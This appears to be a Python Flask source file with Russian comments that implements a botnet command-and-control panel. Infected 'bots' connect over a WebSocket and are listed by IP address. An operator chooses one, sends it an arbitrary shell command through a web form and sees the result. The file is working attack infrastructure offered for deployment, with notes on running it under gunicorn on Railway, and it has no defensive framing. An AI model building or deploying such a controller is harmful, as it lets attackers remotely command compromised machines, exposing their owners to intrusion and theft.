import time
from flask import Flask, render_template_string, request
from flask_sock import Sock

# --- Инициализация Flask и Websockets ---
app = Flask(__name__)
sock = Sock(app)

# --- Глобальные переменные ---
bots = {}  # { 'ip:port': ws_object }
# Словарь для хранения ID бота по объекту ws, чтобы его можно было удалить при дисконнекте
ws_map = {} 
command_results = {} # { 'ip:port': 'result' }

# --- HTML-шаблон (остается таким же, как и был) ---
HTML_TEMPLATE = """
<!doctype html>
<html lang="ru"><head><meta charset="utf-8"><title>Панель управления</title>
<style>body{font-family:monospace;background-color:#1a1a1a;color:#0f0;} .container{width:80%;margin:auto;} h1,h2{text-align:center;} table{width:100%;border-collapse:collapse;margin-bottom:20px;} th,td{border:1px solid #0f0;padding:8px;text-align:left;} form{margin-top:20px;} select,input[type="text"]{width:100%;padding:10px;margin-bottom:10px;background-color:#333;color:#0f0;border:1px solid #0f0;} input[type="submit"]{background-color:#0f0;color:#1a1a1a;padding:10px;border:none;cursor:pointer;} pre{background-color:#000;padding:15px;border:1px solid #0f0;white-space:pre-wrap;word-wrap:break-word;}</style>
</head><body><div class="container"><h1>Панель управления (WebSocket Edition)</h1><h2>Активные боты: {{ bots|length }}</h2>
{% if bots %}<table><tr><th>ID Бота (IP)</th></tr>
{% for bot_id in bots.keys() %}<tr><td>{{ bot_id }}</td></tr>{% endfor %}</table>
<form method="post" action="/command"><label for="bot_id">Выберите бота:</label><select name="bot_id" id="bot_id">
{% for bot_id in bots.keys() %}<option value="{{ bot_id }}">{{ bot_id }}</option>{% endfor %}</select>
<label for="command">Введите команду:</label><input type="text" name="command" id="command" required><input type="submit" value="Отправить команду"></form>
{% else %}<p>Нет активных ботов.</p>{% endif %}
{% if command_sent and result %}<h2>Результат выполнения команды "{{ command_sent }}" на боте {{ target_bot }}:</h2><pre>{{ result }}</pre>{% endif %}
</div></body></html>
"""

# --- Логика Flask ---
@app.route('/')
def index():
    # Главная страница, отображает список ботов и форму
    return render_template_string(HTML_TEMPLATE, bots=bots)

@app.route('/command', methods=['POST'])
def command():
    bot_id = request.form.get('bot_id')
    cmd = request.form.get('command')
    result_text = "Ошибка: бот не найден или отвалился."

    if bot_id in bots:
        try:
            ws = bots[bot_id]
            ws.send(cmd) # Отправляем команду через WebSocket

            # Ждем результат с небольшой задержкой. В реальном мире нужна система получше.
            time.sleep(2) 
            result_text = command_results.get(bot_id, "Бот не ответил.")

        except Exception as e:
            result_text = f"Ошибка при отправке команды: {e}"
            # Если отправка не удалась, считаем бота мертвым
            if bot_id in bots: del bots[bot_id]

    return render_template_string(HTML_TEMPLATE, bots=bots, result=result_text, command_sent=cmd, target_bot=bot_id)

# --- Логика WebSocket сервера ---
@sock.route('/ws')
def websocket_handler(ws):
    # Этот роут будет слушать подключения ботов по адресу /ws
    bot_id = ws.environ.get('REMOTE_ADDR', 'unknown_ip')
    bots[bot_id] = ws
    ws_map[ws] = bot_id
    print(f"[+] Новый бот подключился: {bot_id}")

    try:
        while True:
            # Ждем результат от бота и сохраняем его
            result = ws.receive()
            command_results[bot_id] = result
            # print(f"Получен результат от {bot_id}") # для отладки
    except Exception:
        # Если соединение разорвано, удаляем бота из наших списков
        dead_bot_id = ws_map.get(ws)
        if dead_bot_id and dead_bot_id in bots:
            del bots[dead_bot_id]
        if ws in ws_map:
            del ws_map[ws]
        print(f"[-] Бот {dead_bot_id} отвалился.")

# Этот блок для локального теста, Railway его использовать не будет
if __name__ == '__main__':
    print("Запустите через gunicorn, а не напрямую!")
    print("gunicorn --threads 5 -w 1 web_panel:app")